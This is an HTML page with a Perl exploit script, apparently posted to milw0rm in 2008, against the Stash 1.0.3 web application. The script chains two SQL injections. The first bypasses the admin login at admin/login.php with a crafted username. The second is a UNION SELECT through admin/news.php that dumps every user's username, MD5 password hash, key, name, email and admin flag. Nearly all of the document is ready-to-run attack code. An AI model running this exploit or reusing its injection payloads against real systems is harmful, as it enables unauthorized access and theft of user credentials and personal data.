<html><head><title>Stash 1.0.3 (SQL) User Credentials Disclosure Exploit</title></head><pre>#!/usr/bin/perl -w
#
# User credentials disclosure exploit - stash103exp.pl
#
# Gnix &lt;gnixmail@gmail.com&gt;
# http://gnix.netsons.org
# 
# This exploit use an SQL Injection in the file admin/login.php to 
# bypass the login, and then an SQL Injection in the admin/news.php 
# to extract all the users info. Note: password are crypted with md5.
#
# Output for each user:
# user_id:user_username:user_password:user_key:user_firstname user_lastname:user_email:user_admin
#

use strict;
use LWP::UserAgent;
use HTTP::Request;
use HTTP::Response;
use HTTP::Cookies;


# Variables
my $cjar  = new HTTP::Cookies( file =&gt; 'cookies.txt', 
                               autosave =&gt; 1, 
                               ignore_discard =&gt; 0);
my $agent = new LWP::UserAgent;
$agent-&gt;agent('Lynxy/6.6.6dev.8 libwww-FM/3.14159FM');
  

# Check argv
if(@ARGV != 3) {
  print &quot;[?] Usage  : perl stash103exp.pl &lt;stash_dir_address&gt; &lt;admin_username&gt; &lt;table_prefix&gt;\n&quot;;
  print &quot;[?] Example: perl stash103exp.pl http://site/stash/ avril st_\n&quot;;
  exit(1); 
}


# Authentication
if(!auth($ARGV[0],$ARGV[1])) {
  print &quot;[!] Error during the authentication!\n&quot;;
  exit(1);
}


# Extract all the user information
my $info = extract_data($ARGV[0],$ARGV[2]);
if(!$info) {
  print &quot;[!] Error when extracting data!\n&quot;;
  exit(1);
}


# Print user information
$_ = $info;
my @users = m/&lt;1&gt;(.+?)&lt;2&gt;/g;
foreach my $user (@users) {
  print $user.&quot;\n&quot;;
}


exit(0);

###########################################################################



# Login as $ARGV[1] and save the PHPSESSID cookie
sub auth
{
  my $address = shift;
  my $username= shift;

  # Login
  my $response= $agent-&gt;post($address.'admin/login.php', 
                             {username   =&gt; &quot;' OR user_username = '$username&quot;, 
                              password   =&gt; &quot;any&quot;,
                              submit    =&gt; &quot;Log in&quot;});

  # Save PHPSESSID cookie
  $cjar-&gt;extract_cookies($response);

  return $response-&gt;is_redirect();
}



# Inject a query through news.php to extract all the info about every user
sub extract_data
{
  my $address  = shift;
  my $prefix  = shift;

  my $query = &quot;-1 UNION SELECT 1 AS news_id, 'Injection' AS news_title,  &quot;.
   &quot;CONCAT('&lt;1&gt;',user_id,':',user_username,':',user_password,':',user_key,&quot;.
  &quot;':',user_firstname,' ', user_lastname,':', user_email,':', user_admin,&quot;.
  &quot;'&lt;2&gt;') AS news_body, 'Mitnick' AS news_author, NOW() AS news_date, 0  &quot;.
  &quot;AS news_comment FROM &quot;.$prefix.&quot;news, &quot;.$prefix.&quot;user&quot;;

  my $request = new HTTP::Request('GET', $address.'admin/news.php?post='.$query);

  $agent-&gt;cookie_jar($cjar);
  my $response= $agent-&gt;request($request);

  if($response-&gt;is_success()) {
    return $response-&gt;content();
  }
  else {
    return undef;
  }
}

# milw0rm.com [2008-10-09]</pre></html>